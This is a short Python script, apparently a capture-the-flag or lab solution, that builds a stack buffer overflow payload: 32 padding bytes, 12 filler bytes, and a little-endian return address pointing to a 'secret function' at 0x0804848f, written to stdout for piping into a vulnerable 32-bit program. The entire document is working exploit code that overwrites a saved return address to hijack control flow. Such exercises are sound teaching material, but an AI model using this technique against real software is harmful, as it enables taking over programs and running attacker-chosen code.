# 0804848f address of secret function
import sys

address = b"\x08\x04\x84\x8f"[::-1]
payload = b"A" * 32 + b"BBBBCCCCDDDD" + address
sys.stdout.buffer.write(payload)
